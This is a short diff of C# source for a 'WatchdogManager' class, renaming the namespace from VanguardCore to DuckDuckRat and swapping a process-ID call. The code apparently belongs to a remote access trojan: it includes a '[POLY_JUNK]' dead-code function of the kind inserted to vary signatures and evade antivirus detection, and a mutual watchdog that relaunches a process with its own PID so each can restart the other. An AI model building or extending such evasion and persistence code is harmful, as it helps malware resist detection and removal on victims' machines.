@@ -3,12 +3,12 @@ using System.Diagnostics;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public class WatchdogManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_0d7900fd() {
+        private static void _DuckDuckRat_0d7900fd() {
             int val = 16031;
             if (val > 50000) Console.WriteLine("Hash:" + 16031);
         }
@@ -50,7 +50,7 @@ namespace VanguardCore.Modules
                         
                         try 
                         {
-                            int myPid = Process.GetCurrentProcess().Id;
+                            int myPid = Environment.ProcessId;
                             // Re-launch with my PID so IT can monitor ME
                             Process.Start(new ProcessStartInfo 
                             { 
@@ -83,3 +83,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
